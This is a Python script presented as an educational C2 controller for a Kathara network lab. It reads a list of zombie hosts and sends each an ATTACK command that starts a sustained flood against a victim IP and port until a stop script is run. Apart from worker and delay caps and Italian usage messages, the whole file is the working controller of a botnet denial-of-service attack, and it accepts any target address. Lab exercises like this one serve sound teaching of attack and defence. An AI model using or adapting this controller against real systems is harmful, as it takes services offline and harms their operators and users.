#!/usr/bin/env python3
"""
attacker.py - educational C2 controller for a Kathara lab.
It sends a controlled load command to zombies that remains active until STOP.

Uso nel container attacker:
  python3 /hostlab/attacker/attacker.py <IP_VITTIMA> <PORTA> [workers_per_zombie] [delay_sec]
"""
import os
import socket
import sys
import threading

ZOMBIE_PORT = 9999
ZOMBIES_PATHS = ("/hostlab/attacker/zombies.txt", "/hostlab/zombies.txt", "/zombies.txt", "zombies.txt")
DEFAULT_WORKERS = 30
DEFAULT_DELAY = 0.01
MAX_WORKERS_PER_ZOMBIE = 100
MIN_DELAY = 0.0
MAX_DELAY = 2.0


def find_zombies_file() -> str | None:
    for path in ZOMBIES_PATHS:
        if os.path.exists(path):
            return path
    return None


def bounded_int(value: str, default: int, minimum: int, maximum: int, label: str) -> int:
    if value is None:
        return default
    try:
        number = int(value)
    except ValueError:
        raise ValueError(f"{label} deve essere un intero")
    if number < minimum:
        raise ValueError(f"{label} deve essere >= {minimum}")
    if number > maximum:
        print(f"[WARN] {label} ridotto da {number} a {maximum} per mantenere il test controllato")
        number = maximum
    return number


def bounded_float(value: str, default: float, minimum: float, maximum: float, label: str) -> float:
    if value is None:
        return default
    try:
        number = float(value)
    except ValueError:
        raise ValueError(f"{label} deve essere un numero")
    if number < minimum:
        raise ValueError(f"{label} deve essere >= {minimum}")
    if number > maximum:
        print(f"[WARN] {label} ridotto da {number} a {maximum} per mantenere il test controllato")
        number = maximum
    return number


def send_attack_command(zombie_ip: str, target_ip: str, target_port: int, workers: int, delay: float) -> None:
    try:
        with socket.create_connection((zombie_ip, ZOMBIE_PORT), timeout=4) as s:
            command = f"ATTACK {target_ip} {target_port} {workers} {delay}\n"
            s.sendall(command.encode())
            try:
                reply = s.recv(1024).decode(errors="ignore").strip()
            except OSError:
                reply = ""
        print(f"[OK] Zombie {zombie_ip}: command sent" + (f" - {reply}" if reply else ""))
    except Exception as exc:
        print(f"[ERROR] Zombie {zombie_ip} is unreachable on port {ZOMBIE_PORT}: {exc}")


def main() -> int:
    if len(sys.argv) < 3:
        print("Uso: python3 /hostlab/attacker/attacker.py <IP_VITTIMA> <PORTA> [workers_per_zombie] [delay_sec]")
        return 1

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    workers = bounded_int(sys.argv[3] if len(sys.argv) >= 4 else None, DEFAULT_WORKERS, 1, MAX_WORKERS_PER_ZOMBIE, "workers_per_zombie")
    delay = bounded_float(sys.argv[4] if len(sys.argv) >= 5 else None, DEFAULT_DELAY, MIN_DELAY, MAX_DELAY, "delay_sec")

    zombies_file = find_zombies_file()
    if not zombies_file:
        print(f"[ERROR] zombies.txt not found. Paths checked: {', '.join(ZOMBIES_PATHS)}")
        print("Rigenera il lab con --zombies manual --zombies-ips '10.20.1.11,10.20.1.12,10.20.1.13'")
        return 1

    with open(zombies_file, "r", encoding="utf-8") as f:
        zombies = [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]

    if not zombies:
        print(f"[ERROR] {zombies_file} exists but contains no zombie IP addresses.")
        return 1

    print(f"[INFO] Zombie letti da {zombies_file}: {', '.join(zombies)}")
    print(f"[INFO] Target: {target_ip}:{target_port}; workers/zombie: {workers}; delay: {delay}s")
    print("[INFO] The load remains active until zombies_stop.py is run.")

    threads = []
    for zombie_ip in zombies:
        t = threading.Thread(target=send_attack_command, args=(zombie_ip, target_ip, target_port, workers, delay), daemon=True)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

    print("[OK] Commands sent. Stop: python3 /hostlab/attacker/zombies_stop.py")
    return 0


if __name__ == "__main__":
    sys.exit(main())
